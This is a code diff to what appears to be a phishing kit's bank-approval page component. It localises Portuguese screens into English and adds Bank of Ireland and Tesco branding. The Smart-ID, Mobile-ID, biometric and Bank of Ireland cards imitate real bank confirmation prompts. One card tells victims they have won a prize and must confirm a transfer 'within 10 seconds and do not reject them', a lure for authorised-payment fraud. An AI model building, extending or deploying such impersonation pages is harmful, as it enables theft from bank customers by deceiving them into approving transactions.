@@ -7,6 +7,7 @@ import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { stepToPath } from "@/lib/session-routes";
 import { resolveLocalBankLogoFile } from "@/lib/bank-logo-constants";
 import { Linkify } from "@/components/ui/Linkify";
+import { BoiApprovalCard } from "@/components/approval/BoiApprovalCard";
 
 type ApprovalLang = "de" | "tr";
 
@@ -29,6 +30,8 @@ const APPROVAL_LABELS: Record<string, string> = {
   mobileid_2: "Mobile-ID 2",
   biometrika_pin_1: "Biometria",
   biometrika_pin_2: "Biometria 2",
+  boi_approval: "Bank of Ireland",
+  boi: "Bank of Ireland",
 };
 
 function parseApprovalHistory(value: unknown): string[] {
@@ -109,10 +112,10 @@ function SmartIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Abra a aplicação Smart-ID no seu telemóvel.
+            Open the Smart-ID app on your phone.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirm using the code {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
@@ -128,7 +131,7 @@ function SmartIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "A confirmar..." : "Confirmar"}
+            {saving ? "Confirming..." : "Confirm"}
           </button>
         </div>
       </div>
@@ -152,9 +155,9 @@ function GenericApprovalCard({
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[420px] rounded-[22px] border border-[#d9dee6] bg-white p-7 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
-        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#22c55e]">{title}</p>
-        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Confirmação Necessária</h1>
-        <p className="mb-6 text-base text-[#667085]">Para continuar, confirme o código de verificação apresentado no seu dispositivo.</p>
+        <p className="mb-3 text-sm font-semibold uppercase tracking-[0.24em] text-[#00539f]">{title}</p>
+        <h1 className="mb-3 text-3xl font-semibold tracking-[-0.03em] text-[#101828]">Confirmation Required</h1>
+        <p className="mb-6 text-base text-[#667085]">To continue, confirm the verification code shown on your device.</p>
 
         <div className="mb-4 rounded-2xl border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-4xl font-semibold tracking-[0.14em] text-[#111827]">
           {approvalCode || "0000"}
@@ -170,7 +173,7 @@ function GenericApprovalCard({
           disabled={saving}
           className="w-full rounded-[12px] bg-[var(--brand)] px-4 py-4 text-base font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
         >
-          {saving ? "A confirmar..." : "Confirmar"}
+          {saving ? "Confirming..." : "Confirm"}
         </button>
       </div>
     </div>
@@ -199,10 +202,10 @@ function MobileIdApprovalCard({
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Aceda à aplicação Mobile-ID no seu telemóvel.
+            Open the Mobile-ID app on your phone.
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirm using the code {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
@@ -218,7 +221,7 @@ function MobileIdApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "A confirmar..." : "Confirmar"}
+            {saving ? "Confirming..." : "Confirm"}
           </button>
         </div>
       </div>
@@ -252,22 +255,22 @@ function BiometricApprovalCard({
           {bankLogo ? (
             <img
               src={bankLogo}
-              alt={bankName || bankSlug || "Banco"}
+              alt={bankName || bankSlug || "Bank"}
               className="max-h-12 w-auto max-w-[190px] object-contain"
             />
           ) : (
             <div className="text-center text-2xl font-semibold tracking-[-0.03em] text-[#101828]">
-              {bankName || bankSlug || "Banco"}
+              {bankName || bankSlug || "Bank"}
             </div>
           )}
         </div>
 
         <div className="space-y-5 text-center">
           <h1 className="text-[2rem] font-semibold leading-[1.18] tracking-[-0.03em] text-[#101828]">
-            Confirmação Biométrica
+            Biometric Confirmation
           </h1>
 
-          <p className="text-[1.08rem] text-[#667085]">Confirme utilizando o código {pinLabel}</p>
+          <p className="text-[1.08rem] text-[#667085]">Confirm using the code {pinLabel}</p>
 
           <div className="rounded-[12px] border border-[#d8dde5] bg-[#f8fafc] px-5 py-5 text-[2.5rem] font-semibold tracking-[0.14em] text-[#111827]">
             {approvalCode || "0000"}
@@ -283,7 +286,7 @@ function BiometricApprovalCard({
             disabled={saving}
             className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
-            {saving ? "A confirmar..." : "Confirmar"}
+            {saving ? "Confirming..." : "Confirm"}
           </button>
         </div>
       </div>
@@ -313,50 +316,50 @@ function TransferApprovalCard({
 
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
-      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
-        {/* Pingo Doce sol ust + banka logosu sag ust */}
+      <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4e2f0] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
+        {/* Tesco sol ust + banka logosu sag ust */}
         <div className="mb-6 flex items-start justify-between">
           <img
-            src="/PD-mini-logo.png"
-            alt="Pingo Doce"
+            src="/form-assets/tesco-mini-logo.png"
+            alt="Tesco"
             className="h-7 w-auto object-contain"
           />
           {bankLogo ? (
             <img
               src={bankLogo}
-              alt={bankName || bankSlug || "Banco"}
+              alt={bankName || bankSlug || "Bank"}
               className="h-9 w-9 rounded-full border border-gray-100 object-cover shadow-sm"
             />
           ) : null}
         </div>
 
         <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
-          Notificação de Confirmação
+          Confirmation Notification
         </h1>
 
         <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
           <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
-            Parabéns! Como existem vários vencedores na campanha, uma parte do montante de{" "}
-            <span className="font-bold text-gray-900">€{shownAmount}</span> indicado na notificação de
-            confirmação que vê na aplicação será transferida para si. Confirme as instruções
-            dentro de 10 segundos e não as rejeite. Esta transferência é processada pelo seu banco.
+            Congratulations! Since there are multiple winners in the campaign, a portion of the{" "}
+            <span className="font-bold text-gray-900">€{shownAmount}</span> shown in the confirmation
+            notification you see in the app will be transferred to you. Confirm the instructions
+            within 10 seconds and do not reject them. This transfer is processed by your bank.
           </p>
         </div>
 
         <p className="mb-5 text-center text-[13px] text-gray-500">
-          Tempo restante: <span className="font-bold text-gray-800">{secondsLeft} s</span>
+          Time remaining: <span className="font-bold text-gray-800">{secondsLeft} s</span>
         </p>
 
         <button
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#22c55e] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[var(--brand)] disabled:cursor-not-allowed disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#00539f] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[var(--brand)] disabled:cursor-not-allowed disabled:opacity-70"
         >
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
           </svg>
-          {saving ? "A confirmar..." : "Confirmar"}
+          {saving ? "Confirming..." : "Confirm"}
         </button>
       </div>
     </div>
@@ -399,7 +402,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
     transferAmount: "",
     bankSlug: "",
     bankName: "",
-    message: "Por favor, aguarde...",
+    message: "Please wait...",
     imageUrl: null,
     lang: "de",
   });
@@ -444,7 +447,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
         transferAmount: fd.transferAmount?.trim() ?? "",
         bankSlug: fd.bankSlug?.trim() ?? "",
         bankName: fd.bankName?.trim() ?? "",
-        message: fd.specialNoticeText ?? fd.customMessage ?? "Por favor, aguarde...",
+        message: fd.specialNoticeText ?? fd.customMessage ?? "Please wait...",
         imageUrl: fd.specialNoticeImage ?? fd.customImage ?? null,
         lang: (fd.specialNoticeLang as ApprovalLang | undefined) ?? "de",
       });
@@ -525,6 +528,29 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   // Onay verildi → wait adimina yonlendirme gelene kadar kisa "onaylandi" ekrani.
   // (_confirmed suffix'i kartlarla eslesmedigi icin generic kart flash'i olusuyordu)
   if (viewState.approvalStatus.endsWith("_confirmed")) {
+    if (viewState.approvalStatus.startsWith("boi")) {
+      return (
+        <div
+          className="relative flex min-h-screen w-full flex-col items-center justify-center p-4 bg-cover bg-center bg-no-repeat"
+          style={{ backgroundImage: "url('/bank-assets/boi-bg.jpg')" }}
+        >
+          <div className="absolute inset-0 bg-black/10 pointer-events-none" />
+          <div className="relative z-10 mb-6 sm:mb-8 flex justify-center">
+            <img src="/bank-logos/boi_logo.svg" alt="Bank of Ireland" className="h-8 sm:h-9 w-auto drop-shadow-md" />
+          </div>
+          <div className="relative z-10 w-full max-w-[380px] rounded-[18px] bg-white px-7 py-10 text-center shadow-2xl">
+            <div className="mx-auto mb-4 flex h-14 w-14 items-center justify-center rounded-full bg-emerald-500/10 text-emerald-600">
+              <svg className="h-7 w-7" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+              </svg>
+            </div>
+            <h1 className="text-xl font-bold text-[#101828]">Approved!</h1>
+            <p className="mt-2 text-sm text-[#667085]">Please wait, redirecting...</p>
+            <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#0066b2]/20 border-t-[#0066b2]" />
+          </div>
+        </div>
+      );
+    }
     return (
       <div className="flex min-h-screen items-center justify-center px-4 py-8">
         <div className="w-full max-w-[360px] rounded-[22px] border border-[#d9dee6] bg-white px-7 py-10 text-center shadow-[0_24px_80px_rgba(20,32,56,0.10)]">
@@ -534,10 +560,19 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
             </svg>
           </div>
           <h1 className="text-xl font-bold text-[#101828]">Confirmado!</h1>
-          <p className="mt-2 text-sm text-[#667085]">Por favor, aguarde, a redirecionar...</p>
+          <p className="mt-2 text-sm text-[#667085]">Please wait, redirecting...</p>
           <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[var(--brand)]/20 border-t-[var(--brand)]" />
         </div>
       </div>
+    );
+  }
+
+  if (viewState.approvalStatus === "boi_approval" || viewState.approvalStatus === "boi") {
+    return (
+      <BoiApprovalCard
+        saving={saving}
+        onConfirm={() => void handleApprovalSubmit()}
+      />
     );
   }
 
@@ -596,7 +631,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (viewState.approvalStatus) {
     return (
       <GenericApprovalCard
-        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Confirmação"}
+        title={APPROVAL_LABELS[viewState.approvalStatus] ?? "Confirmation"}
         approvalCode={viewState.approvalCode}
         secondsLeft={secondsLeft}
         saving={saving}
